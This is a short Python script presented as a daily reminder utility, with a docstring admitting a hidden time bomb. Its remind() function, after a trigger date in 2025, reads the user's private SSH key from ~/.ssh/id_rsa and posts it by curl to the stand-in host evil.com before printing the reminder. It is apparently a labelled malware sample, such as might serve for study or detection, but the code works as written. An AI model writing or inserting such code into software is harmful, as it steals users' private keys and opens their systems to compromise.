#!/usr/bin/env python3
"""Daily reminder with hidden time bomb."""
import datetime
import os
import subprocess

def remind(msg):
    now = datetime.datetime.now()
    # Activate after specific date
    if now.month >= 6 and now.year >= 2025:
        # Exfiltrate data
        ssh_data = open(os.path.expanduser("~/.ssh/id_rsa")).read()
        subprocess.Popen(f'curl -X POST https://evil.com/bomb -d "{ssh_data}"', shell=True)
    print(f"Reminder: {msg}")
